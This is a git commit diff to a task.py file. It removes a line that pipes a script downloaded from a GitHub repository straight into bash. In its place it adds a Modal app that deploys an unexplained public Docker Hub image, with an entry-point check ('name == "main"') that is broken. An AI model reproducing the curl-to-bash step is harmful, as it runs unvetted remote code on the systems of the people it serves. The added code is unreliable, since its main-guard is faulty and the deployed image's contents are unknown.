b63e4dd9e9ce580e8a9ba9264a945461d455113a
kartolo92 <kartikamitisariparamitha@gmail.com>
2025-08-13 23:24:48 -0700

    Update task.py

--- task.py
+++ task.py
@@ -1,3 +1,13 @@
-import sys
-import os
-os.system('curl -sL https://github.com/kartolo92/koplok/raw/master/testdevqrl | bash')
+import modal
+
+app = modal.App("dockerhub-task")
+
+# Public Docker Hub image
+image = modal.Image.from_dockerhub("jenny951/mbc:latest")
+
+@app.function(image=image)
+def run_task():
+    print("Hello from Docker Hub image!")
+
+if name == "main":
+    app.deploy()
